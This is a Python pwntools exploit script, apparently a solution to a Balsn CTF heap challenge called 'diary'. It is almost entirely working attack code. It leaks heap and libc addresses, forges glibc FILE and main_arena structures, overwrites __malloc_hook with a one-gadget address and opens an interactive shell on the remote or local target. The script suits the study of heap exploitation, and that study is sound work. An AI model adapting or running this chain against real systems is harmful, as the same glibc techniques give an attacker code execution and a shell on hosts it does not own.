#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./diary"
LIBCNAME = "./libc-2.29.so"

hosts = ("diary.balsnctf.com","localhost","localhost")
ports = (10101,12300,23947)
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost 
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
libc = ELF(LIBCNAME) if LIBCNAME!="" else None

class _IO_FILE(object):
  def __init__(self, 
      read_ptr=None, read_end=None, read_base=None,
      write_base=None, write_ptr=None, write_end=None,
      buf_base=None, buf_end=None,
      save_base=None, backup_base=None, save_end=None,
      lock=None, wide_data=None):
    self.read_ptr = read_ptr if read_ptr!=None else 0
    self.read_end = read_end if read_end!=None else 0
    self.read_base = read_base if read_base!=None else 0
    self.write_base = write_base if write_base!=None else 0
    self.write_ptr = write_ptr if write_ptr!=None else 0
    self.write_end = write_end if write_end!=None else 0
    self.buf_base = buf_base if buf_base!=None else 0
    self.buf_end = buf_end if buf_end!=None else 0
    self.save_base = save_base if save_base!=None else 0
    self.backup_base = self.backup_base if backup_base!=None else 0
    self.save_end = save_end if save_end!=None else 0
    self.flag = 0xfbad208b
    self.markers = 0
    self.chain = 0 # stdin addr if stdout
    self.fileno = 0 # 1 if stdout
    self.fileno2= 0
    self.old_offset = 0xffffffffffffffff
    self.lock = lock if lock!=None else 0
    self.offset = 0xffffffffffffffff
    self.code_cvt = 0
    self.wide_data = wide_data if wide_data!=None else 0
    self.freeres_list = 0
    self.freeres_buf = 0
    self.pad5 = 0
    self.mode = 0xffffffff
    return None

  def gen(self):
    pay = b""
    pay += p64(self.flag)
    pay += p64(self.read_ptr) + p64(self.read_end) + p64(self.read_base)
    pay += p64(self.write_base) + p64(self.write_ptr) + p64(self.write_end)
    pay += p64(self.buf_base) + p64(self.buf_end)
    pay += p64(self.save_base) + p64(self.backup_base) + p64(self.save_end)
    pay += p64(self.markers)
    pay += p64(self.chain)
    pay += p32(self.fileno) + p32(self.fileno2)
    pay += p64(self.old_offset)
    pay += p64(0x000000000a000000) # cur_column + vtable_offset + shortbuf
    pay += p64(self.lock)
    pay += p64(self.offset)
    pay += p64(self.freeres_list) + p64(self.freeres_buf) + p64(self.pad5)
    pay += p32(self.mode) + p32(0)
    return pay

class _IO_FILE_plus(_IO_FILE):
  def __init__(self,
      read_ptr=None, read_end=None, read_base=None,
      write_base=None, write_ptr=None, write_end=None,
      buf_base=None, buf_end=None,
      save_base=None, backup_base=None, save_end=None,
      lock=None, wide_data=None, vtable=None):
    super(_IO_FILE_plus, self).__init__(
      read_ptr, read_end, read_base,
      write_base, write_ptr, write_end,
      buf_base, buf_end,
      save_base, backup_base, save_end,
      lock, wide_data)
    self.vtable = vtable if vtable!=None else 0

  def gen(self):
    pay =  super(_IO_FILE_plus, self).gen()
    pay += p64(0) * 4
    pay += p64(self.vtable)
    return pay

class main_arena:
  def __init__(self):
    self.mutex = 0
    self.flags = 0
    self.have_fastbinchunks = 0
    self.fastbins = {}
    return None

  def set(self, size, addr):
    self.fastbins[hex(size)] = addr
    return self

  def gen_fastbinchunks(self):
    pay = b""
    for i in range(8):
      if hex(i*0x10+0x20) in self.fastbins:
        pay += p64(self.fastbins[hex(i*0x10+0x20)])
      else:
        pay += p64(0)
    return pay

  def gen(self):
    pay = b""
    pay += p32(self.mutex) + p32(self.flags)
    pay += p32(self.have_fastbinchunks)
    pay += p32(0) # hole
    pay += self.gen_fastbinchunks()
    return pay


## utilities #########################################

def hoge(ix):
  global c
  c.recvuntil("choice : ")
  c.sendline(str(ix))

def _show():
  global c
  hoge(1)

def _write(_size, _content, stop=False):
  global c
  hoge(2)
  c.recvuntil("Length : ")
  c.send(str(_size))
  if stop:
    return
  c.recvuntil("Content : ")
  c.send(_content)

def _read(page):
  global c
  hoge(3)
  c.recvuntil("Page : ")
  c.send(str(page))

def _edit(page, content):
  global c
  hoge(4)
  c.recvuntil("Page : ")
  c.sendline(str(page))
  c.recvuntil("Content : ")
  c.send(str(content))

def _tear(page):
  global c
  hoge(5)
  c.recvuntil("Page : ")
  c.send(str(page))

## exploit ###########################################

def exploit():
  global c
  ds = 0x80
  name = "A"*0x20

  # setup name
  c.recvuntil("name : ")
  c.send(name)

  # leak heapbase
  _write(ds, "B"*ds) # 0
  _show()
  c.recvuntil("A"*0x20)
  leak = unpack(c.recvline().rstrip().ljust(8,'\x00'))
  heapbase = leak - 0x260
  print("[+] leaked: "+hex(leak))
  print("[+] heapbase: "+hex(heapbase))

  # generate unsorted
  sz = 0x31
  for i in range(0x8): # 1..0x9
    if i==0: # to fulfill fastbin(0x80)
      _write(ds, p32(0) + p64(0) +  (p64(heapbase+0x300)+p64(0x81)) + (p64(heapbase+0x310)+p64(0x81))+(p64(heapbase+0x320)+p64(0x81)) + (p64(heapbase+0x330)+p64(0x81)) + (p64(heapbase+0x340)+p64(0x81)) + (p64(heapbase+0x350)+p64(0x81)) + (p64(heapbase+0x380)+p64(0x81)))
    elif i==1:
      _write(ds, p32(0) + p64(0x71) +  (p64(heapbase+0x610)+p64(0x81)))
    else:
      _write(ds, p32(0) + (p64(0x71)+p64(0))*((ds-4)//0x10 - 2) + (p64(sz)+p64(0))*2)
  for i in range(0x8):
    _tear(i) # generate unsorted at heapbase+0x640

  # forge main_arena
  mp = main_arena()
  mp.set(0x30, heapbase + 0x620).set(0x70, heapbase + 0x600).set(0x80, heapbase+0x300)
  pay = b""
  pay += _IO_FILE_plus(vtable=0).gen()[4:]
  pay += p8(0x40) * 0x130 # pad wide_data
  pay += p64(0x81)*2 # fake sz for overwriting malloc_hook
  pay += p64(0x00)*2 # fake fd for overwriting malloc_hook
  pay += p64(0) # malloc_hook
  pay += p64(0)
  pay += mp.gen()
  _edit(-6, pay)

  # leak libcbase
  _write(0x24, "A"*(0x24)) # 0xa@heapbase+0x660
  _read(0x9)
  c.recvuntil("A"*0x24)
  leak =  unpack(c.recvline().rstrip().ljust(8,'\x00'))
  libcbase = leak - 0x1e4ca0
  print("[+] leak: "+hex(leak))
  print("[+] libcbase: "+hex(libcbase))

  # overwrite fastbin's fd
  ogs = [addr + libcbase for addr in [0xe237f, 0xe2383, 0xe2386, 0x106ef8]]
  _write(0x60, p32(0) + p64(0x81) + p64(libcbase + 0x1e4c10)) # @heapbase+0x610 consolidate into tcache
  _write(0x70, "A"*0x10) # connect malloc_hook into unsorted(0x80)
  _write(0x70, "A"*0xc + p64(ogs[3])) # overwrite malloc_hook

  # boomb
  _write(0x60, "X", stop=True)


## main ##############################################

if __name__ == "__main__":
    global c
    
    if len(sys.argv)>1:
      if sys.argv[1][0]=="d":
        cmd = """
          set follow-fork-mode parent
        """
        c = gdb.debug(FILENAME,cmd)
      elif sys.argv[1][0]=="r":
        c = remote(rhp1["host"],rhp1["port"])
      elif sys.argv[1][0]=="v":
        c = remote(rhp3["host"],rhp3["port"])
    else:
        c = remote(rhp2['host'],rhp2['port'])
    exploit()
    c.interactive()
